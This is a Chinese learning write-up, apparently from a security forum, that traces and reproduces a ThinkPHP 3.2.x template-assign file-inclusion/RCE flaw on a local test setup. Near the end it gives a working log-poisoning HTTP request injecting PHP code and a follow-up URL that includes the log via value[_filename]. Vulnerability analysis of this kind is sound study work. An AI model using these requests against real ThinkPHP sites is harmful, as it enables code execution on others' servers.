前言
--

无意间在最新的漏洞报告中看到关于ThinkPHP3.2.x RCE漏洞通报,最近正好在学习php相关知识,准备闲来无事分析和复现一波。

环境搭建
----

phpstudy+php7.3.4+ThinkPHP3.2.3+windows10

在`\Application\Home\Controller\IndexController.class.php`目录下添加如下代码

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index($value=''){
        $this->assign($value);
        $this->display();
    }
}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-976886b2d249492a60ac08d55b87796c91842a74.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-976886b2d249492a60ac08d55b87796c91842a74.png)  
因为该漏洞利用的assign函数需要模板渲染，所以需要创建对应的模板文件，内容随意，模板文件位置：

```php
\Application\Home\View\Index\index.html
```

漏洞介绍
----

该漏洞产生原因是由于在业务代码中如果对模板赋值方法`assign的第一个参数可控`，则导致模板路径变量被覆盖为携带攻击代码路径，造成文件包含，代码执行等危害。

漏洞分析
----

文件`Application/Home/Controller/IndexController.class.php`  
assign方法中第一个变量为可控变量。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c2e0c09b6e59efa362f3fbb7c60991ae4084bd99.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c2e0c09b6e59efa362f3fbb7c60991ae4084bd99.png)

进入到assign方法中  
`ThinkPHP/Library/Think/Controller.class.php`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5972c2dc58634faf8f530c43ba10ebb74f7dd025.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5972c2dc58634faf8f530c43ba10ebb74f7dd025.png)

实际上调用的是`ThinkPHP/Library/Think/View.class.php`中的assign函数,并赋值给`$this→tVar`变量。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-999077968b520cf9598f6351a39b1ddf656b4f8e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-999077968b520cf9598f6351a39b1ddf656b4f8e.png)

然后进入`display`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11262015da8ed383e2798f347f223589d4eefbb6.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-11262015da8ed383e2798f347f223589d4eefbb6.png)

`Controller.class.php`的display调用`View.class.php`的display。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b38275d790d8ddb218e13633c231552fbcb5889.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-2b38275d790d8ddb218e13633c231552fbcb5889.png)

调用`fetch`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2b8be5a2059159a8fe1955062c72d9aa567d96f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e2b8be5a2059159a8fe1955062c72d9aa567d96f.png)

跟进`fetch`方法,先会判断模板文件是否存在,不存在直接返回。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21816649b59956f3743073bb1740a49e91b5119a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-21816649b59956f3743073bb1740a49e91b5119a.png)

然后由于系统配置的默认模板引擎为Think,所以走else分支  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfa1e9062df98da036b4b7cb5fa3242bdcf4fae7.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-bfa1e9062df98da036b4b7cb5fa3242bdcf4fae7.png)

将`$this→tVar`变量值赋值给`$params`，此时var为传入的日志路径，file为模板文件的路径。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-024789b4c0044e03d9ab98c417c181c34deca116.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-024789b4c0044e03d9ab98c417c181c34deca116.png)

跟进listen函数,经过一些判断后进入`exec`函数中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-121184958bc3a031adc12ee6c01c193f56017ac8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-121184958bc3a031adc12ee6c01c193f56017ac8.png)

经过一定处理后将调用`Behavior\ParseTemplateBehavior`类中的`run`方法处理`$params`,而其中储存着带有日志文件路径的值。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d03cb6c774836ed56f42f92d080d1e1bf41db01a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d03cb6c774836ed56f42f92d080d1e1bf41db01a.png)

进入`\ThinkPHP\Library\Behavior\ParseTemplateBehavior.class.php`的run函数。寻找谁继续处理了日志文件路径,发现为`ThinkPHP/Library/Think/Template.class.php`的fetch方法,其中`$_data[var]`储存了日志文件路径的变量值。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ea0d2e7af1844fd006cd334e03ec8cba4860dc13.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ea0d2e7af1844fd006cd334e03ec8cba4860dc13.png)

最后跟进到`Storage`的`load`方法  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-64af8273d71cd3e05087e09b75b1c7421aa668b8.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-64af8273d71cd3e05087e09b75b1c7421aa668b8.png)

判断`$vars`值是否为空,不为空则会以`EXTR_OVERWRITE`属性覆盖`$_filename`原有的值。最后`$_filename`将等于`./Application/Runtime/Logs/Common/21_08_23.log`,最后形成文件包含。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d9ab38966d292415b9edc8afda4269e73c3c516f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d9ab38966d292415b9edc8afda4269e73c3c516f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1b87f3af9b0c6fa2b277c6b46c8be92f1183f90.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c1b87f3af9b0c6fa2b277c6b46c8be92f1183f90.png)

漏洞复现
----

创建log文件  
<http://127.0.0.1/tp3/index.php?m>=--&gt;&lt;?=phpinfo();?&gt;

```php
GET /tp3/index.php?m=--><?=phpinfo();?> HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: PHPSESSID=np6v88jt9982el6btpcm998moe
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1

```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-506e0805f1a9072652e6ece185016b5f6d8d6957.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-506e0805f1a9072652e6ece185016b5f6d8d6957.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e6bfd6935ed9398808d2e2f379132bb21cd63a2b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e6bfd6935ed9398808d2e2f379132bb21cd63a2b.png)  
包含log文件,注意日志文件名,tp的日志文件名和年月日是相关的。

```php
http://127.0.0.1/tp3/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_08_23.log
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c6558d726ab2440149461e72fcbc4033033dd5a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-c6558d726ab2440149461e72fcbc4033033dd5a1.png)

后记
--

该漏洞由(【漏洞通报】ThinkPHP3.2.x RCE漏洞通报)\[[https://mp.weixin.qq.com/s?\_\_biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247487129&amp;idx=1&amp;sn=3d80cc03e4f03a6bdb2be1611e98957c](https://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&mid=2247487129&idx=1&sn=3d80cc03e4f03a6bdb2be1611e98957c)\] 在  
今年07月12日率先纰漏,不过看到有大佬说这好像是个老洞,有类似的。不过这都与小弟无关,作为入门新手进行学习。如有错误请师傅们斧正。